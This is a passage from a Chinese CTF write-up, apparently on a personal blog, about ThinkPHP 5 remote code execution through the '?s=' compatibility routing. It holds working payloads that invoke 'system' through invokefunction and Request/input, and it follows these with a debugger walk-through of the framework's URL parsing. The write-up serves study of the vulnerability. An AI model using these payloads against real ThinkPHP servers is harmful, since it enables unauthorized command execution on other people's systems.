</span></span><span class=line><span class=cl><span class=err>?</span><span class=n>s</span><span class=o>=</span><span class=n>index</span><span class=o>/</span>\<span class=n>think</span>\<span class=ne>Container</span><span class=o>/</span><span class=n>invokefunction</span><span class=o>&amp;</span><span class=n>function</span><span class=o>=</span><span class=n>call_user_func_array</span><span class=o>&amp;</span><span class=n>vars</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=n>system</span><span class=o>&amp;</span><span class=n>vars</span><span class=p>[</span><span class=mi>1</span><span class=p>][]</span><span class=o>=</span><span class=n>dir</span>
</span></span></code></pre></td></tr></table></div></div><p>终于，爽了，嘿嘿，其中注意我使用的php版本是7.2.9，我们随便选一个进行测试，首先先黑盒测试一下，我们正常的调用，肯定都是写<code>/</code>，但是我这里发现，他直接给我全部变成<code>\</code>了</p><p><img src=/p/ctfshow-thinkphp-special/QQ20250220-110211.jpg width=1110 height=730 srcset="/p/ctfshow-thinkphp-special/QQ20250220-110211_hu_aa7b23bb221c86f2.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250220-110211_hu_891e5b10055caff.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=152 data-flex-basis=364px></p><p>那我们反其道行之，全部用<code>\</code>看看，发现没变，那进行穿插看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=err>?</span><span class=n>s</span><span class=o>=</span><span class=n>index</span>\<span class=n>think</span><span class=o>/</span><span class=n>request</span>\<span class=ne>Input</span>
</span></span><span class=line><span class=cl><span class=c1># 得到回显</span>
</span></span><span class=line><span class=cl><span class=c1># 模块不存在:index\think</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=n>s</span><span class=o>=</span><span class=n>index</span><span class=o>/</span><span class=n>think</span>\<span class=n>request</span><span class=o>/</span><span class=ne>Input</span>
</span></span><span class=line><span class=cl><span class=c1># 得到回显</span>
</span></span><span class=line><span class=cl><span class=c1># 模块不存在:variable type error： array</span>
</span></span></code></pre></td></tr></table></div></div><p>参数正常了，但是并不确定这是不是正确的规律，于是把上面的路由全部都用一遍</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?s=index/think\Container/invokefunction
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?s=index/think\app/invokeFunction
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>?s=index/think\request/Input
</span></span></code></pre></td></tr></table></div></div><p>正在我快乐的实验的时候我发现<code>?s=index/think\view\driver/Think/__call</code>以及<code>?s=index/think\template\driver/File/write</code>都没成功，也就是说这不是规律，而是TP的某种规则，查资料找到</p><blockquote><p>?s=类/方法&参数=值
?s=命名空间\类/方法&参数=值</p></blockquote><p>那刚才没成功的payload是<code>File</code>类的<code>write</code>方法，<code>Think</code>类的<code>__call</code>方法，所以这里我们要这么写</p><p><img src=/p/ctfshow-thinkphp-special/QQ20250220-111602.jpg width=987 height=765 srcset="/p/ctfshow-thinkphp-special/QQ20250220-111602_hu_ec9d21c219c9f341.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250220-111602_hu_80394dcf43f5882f.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=129 data-flex-basis=309px></p><p><img src=/p/ctfshow-thinkphp-special/QQ20250220-111812.jpg width=1014 height=714 srcset="/p/ctfshow-thinkphp-special/QQ20250220-111812_hu_e9044702a1e39e5f.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250220-111812_hu_91891c683f43c458.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=142 data-flex-basis=340px></p><p>因为没有index方法所以报错，但是初始化类是成功了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?s=index/think\template\driver\File/write
</span></span><span class=line><span class=cl>?s=index/think\view\driver\Think/__call
</span></span></code></pre></td></tr></table></div></div><p>开始调试的时候我们要知晓为什么，thinkphp默认没有开启强制路由，我们可以使用兼容模式来调用控制器</p><p><img src=/p/ctfshow-thinkphp-special/QQ20250220-134119.jpg width=1347 height=759 srcset="/p/ctfshow-thinkphp-special/QQ20250220-134119_hu_bbd4fa729026e221.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250220-134119_hu_3310ea0294b22825.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=177 data-flex-basis=425px></p><p>这也是我们参数为什么写<code>s</code>的原因，同时在官方修改代码的部分打下断点，poc为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://127.0.0.3/public/?s=index/\think\Request/input&amp;filter[]=system&amp;data=calc
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/ctfshow-thinkphp-special/QQ20250220-135050.jpg width=1551 height=926 srcset="/p/ctfshow-thinkphp-special/QQ20250220-135050_hu_b332a9973e323ebd.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250220-135050_hu_9989dda66a0dd5d9.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=167 data-flex-basis=401px></p><p>跟进得到</p><p><img src=/p/ctfshow-thinkphp-special/QQ20250220-140321.jpg width=1717 height=924 srcset="/p/ctfshow-thinkphp-special/QQ20250220-140321_hu_348b20416f6e20d7.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250220-140321_hu_3cf19cf6b56e5676.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=185 data-flex-basis=445px></p><p>看到是转换控制器名的，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>echo</span> <span class=nx>MyClass</span><span class=o>::</span><span class=na>parseName</span><span class=p>(</span><span class=s1>&#39;my_variable_name&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span> <span class=c1>// 输出: MyVariableName
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>MyClass</span><span class=o>::</span><span class=na>parseName</span><span class=p>(</span><span class=s1>&#39;my_variable_name&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span> <span class=c1>// 输出: myVariableName
</span></span></span></code></pre></td></tr></table></div></div><p>类似这种，没什么用，然后是<code>setController</code>和<code>setAction</code>，然后打一遍，发现RCE地方的是这里</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$response = $this-&gt;middleware-&gt;dispatch($this-&gt;request);
</span></span></code></pre></td></tr></table></div></div><p>添加一个变量发现了奇怪的东西，之前没有细看，<code>$this->request->dispatch($dispatch);</code>，我发现</p><p><img src=/p/ctfshow-thinkphp-special/QQ20250220-142729.jpg width=1789 height=948 srcset="/p/ctfshow-thinkphp-special/QQ20250220-142729_hu_b2150ff86b32090a.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250220-142729_hu_6d2ba337903ebb15.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=188 data-flex-basis=452px></p><p>也就是我们刚才黑盒最关心的，为啥要用那样的格式来初始化类和调用方法，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$dispatch = $this-&gt;route-&gt;check($path, $must);
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/ctfshow-thinkphp-special/QQ20250220-143907.jpg width=1776 height=942 srcset="/p/ctfshow-thinkphp-special/QQ20250220-143907_hu_cb8ea662b0b487b1.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250220-143907_hu_c9565abfa005fb0d.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=188 data-flex-basis=452px></p><p>对控制器进行处理，同时进行请求，如果请求到了，就返回，也就是初始我们的类和方法，接着跟进<code>list($path, $var) = $this->rule->parseUrlPath($url);</code>发现解析url的函数，正是我们传参的格式</p><p><img src=/p/ctfshow-thinkphp-special/QQ20250220-144312.jpg width=1484 height=915 srcset="/p/ctfshow-thinkphp-special/QQ20250220-144312_hu_69ec200a91af7f8e.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250220-144312_hu_6a8558e8fa8c45ac.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=162 data-flex-basis=389px></p><p>出来回到<code>thinkphp/library/think/route/dispatch/Url.php</code>也就是一直持续的解析，</p><p><img src=/p/ctfshow-thinkphp-special/QQ20250220-145333.jpg width=1420 height=933 srcset="/p/ctfshow-thinkphp-special/QQ20250220-145333_hu_b8bb9a9f922191a6.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250220-145333_hu_33e8a8451005a515.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=152 data-flex-basis=365px></p><p>再跳转到<code>thinkphp/library/think/route/dispatch/Module.php</code>进行初始化以及导入我们请求到的控制器和类，在进行直接的利用</p><p><img src=/p/ctfshow-thinkphp-special/QQ20250220-145707.jpg width=1485 height=922 srcset="/p/ctfshow-thinkphp-special/QQ20250220-145707_hu_b39b5f58a9e46872.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250220-145707_hu_4ddaf9df7d8ed64d.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=161 data-flex-basis=386px></p><p><img src=/p/ctfshow-thinkphp-special/QQ20250220-145633.jpg width=1436 height=936 srcset="/p/ctfshow-thinkphp-special/QQ20250220-145633_hu_dedef43ff2a9979e.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250220-145633_hu_284cc82fa14dacde.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=153 data-flex-basis=368px></p><p><img src=/p/ctfshow-thinkphp-special/QQ20250220-145758.jpg width=1806 height=993 srcset="/p/ctfshow-thinkphp-special/QQ20250220-145758_hu_f5df338a487aecc1.jpg 480w, /p/ctfshow-thinkphp-special/QQ20250220-145758_hu_5ad224a4e36d05a8.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=181 data-flex-basis=436px></p><p>虽然看完了，但是感觉还是挺混乱的，不过我这个打法基本网上没有参考的，属于是自己慢慢调了十几次调出来的，主要就是<code>url</code>的解析部分，回来直接就调用了，所以调用的部分不是那么的重要</p><h1 id=小结>小结</h1><p>持续更新啊，还是挺多的不过挺有意思，大菜鸡师傅出题就是润！</p><hr><p>序列化篇更新一篇新的续集，这里这个图太多了，不好放了在我的本地文件夹里面</p></section><footer class=article-footer><section class=article-tags><a href=/tags/thinkphp/>Thinkphp</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/ctfshow-thinkphp-sequel-2/><div class=article-details><h2 class=article-title>ctfshowthinkphp(续集二)</h2></div></a></article><article><a href=/p/ctfshow-thinkphp-special-sequel-1/><div class=article-details><h2 class=article-title>ctfshow的thinkphp专题(续集一)</h2></div></a></article><article><a href=/p/ctfshow-watermelon-cup/><div class=article-details><h2 class=article-title>ctfshow西瓜杯</h2></div></a></article><article><a href=/p/ctfshow-new-year-water-friends-match/><div class=article-details><h2 class=article-title>ctfshow元旦水友赛</h2></div></a></article><article><a href=/p/ctfshow-f5-cup/><div class=article-details><h2 class=article-title>ctfshowF5杯</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>